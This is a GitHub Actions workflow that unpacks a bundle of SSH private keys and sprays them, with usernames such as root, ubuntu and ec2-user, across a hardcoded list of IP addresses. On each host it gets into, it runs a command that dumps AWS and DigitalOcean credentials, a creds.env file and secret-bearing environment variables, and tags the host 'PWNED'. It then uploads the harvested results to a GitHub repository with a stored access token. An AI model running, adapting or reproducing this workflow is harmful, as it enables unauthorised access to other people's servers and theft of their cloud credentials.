name: i724k
on:
  workflow_dispatch:
permissions:
  contents: write
jobs:
  keytry:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@v4
      - name: keytry
        env:
          GH_PAT: ${{ secrets.GH_PAT }}
        run: |
          set +e
          : > kres.txt
          echo "RUNNER=$(hostname) EGRESS=$(curl -s -m 10 https://ifconfig.me)" >> kres.txt
          mkdir -p kk && base64 -d i724/keyset.b64 > ks.tgz && tar xzf ks.tgz -C kk
          chmod 600 kk/* 2>/dev/null
          : > kfps.txt
          for f in kk/*; do
            fp=$(ssh-keygen -lf "$f" 2>/dev/null | awk '{print $2}')
            if [ -n "$fp" ]; then
              echo "$fp $f" >> kfps.txt
            else
              echo "BADKEY $f" >> kres.txt
            fi
          done
          awk '!seen[$1]++' kfps.txt > kuniq.txt
          echo "distinct_keys=$(wc -l < kuniq.txt)" >> kres.txt
          cat kuniq.txt >> kres.txt
          printf '%s\n' 39.98.117.218 39.98.119.36 39.98.121.33 39.99.154.8 39.99.156.84 39.99.231.209 47.92.102.199 104.248.81.108 142.93.229.199 159.65.193.67 167.99.214.167 192.241.189.34 64.227.68.177 159.223.208.147 > hosts.txt
          CMD='echo LOGIN_OK uid=$(id -u) host=$(hostname) ip=$(hostname -I 2>/dev/null); echo "--- ulv"; ls -la /root/ulv 2>/dev/null | head; sed -n "1,80p" /root/ulv/creds.env 2>/dev/null; echo "--- env"; env | grep -iE "DO_|DIGITAL|AWS_|ALI_|TENCENT|TOKEN|KEY|SECRET" | head -20; echo "--- cfg"; cat /root/.config/doctl/config.yaml 2>/dev/null | head -5; cat /root/.aws/credentials 2>/dev/null | head -10; echo "--- gpu"; nvidia-smi -L 2>/dev/null | head -8; echo END'
          export CMD
          tryhost(){
            ip="$1"
            while read -r fp kf; do
              for u in root t19 ubuntu admin ec2-user aliyun; do
                out=$(timeout 15 ssh -i "$kf" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 -o PreferredAuthentications=publickey -o LogLevel=ERROR "$u@$ip" "$CMD" 2>&1 | head -50)
                echo "TRY $ip $u $fp => $(echo "$out" | head -1)" >> kres.txt
                case "$out" in *LOGIN_OK*) echo "=== PWNED $ip $u $fp" >> kres.txt; echo "$out" >> kres.txt;; esac
              done
            done < kuniq.txt
          }
          export -f tryhost
          cat hosts.txt | xargs -P 16 -I{} bash -c 'tryhost {}'
          echo "PWNED_COUNT=$(grep -c '^=== PWNED' kres.txt)" >> kres.txt
          b64=$(base64 -w0 kres.txt)
          SHA=$(curl -s -H "Authorization: Bearer $GH_PAT" https://api.github.com/repos/dongsuju/ul-plant/contents/i724/resultk.txt | python3 -c 'import json,sys
          try: print(json.load(sys.stdin).get("sha") or "")
          except: print("")')
          python3 -c 'import json,sys
          o={"message":"i724k keytry","content":sys.argv[1],"branch":"main"}
          if sys.argv[2]: o["sha"]=sys.argv[2]
          print(json.dumps(o))' "$b64" "$SHA" > /tmp/bk.json
          curl -s -X PUT -H "Authorization: Bearer $GH_PAT" -H 'Content-Type: application/json' --data @/tmp/bk.json https://api.github.com/repos/dongsuju/ul-plant/contents/i724/resultk.txt -o /dev/null -w 'PUTK %{http_code}\n'
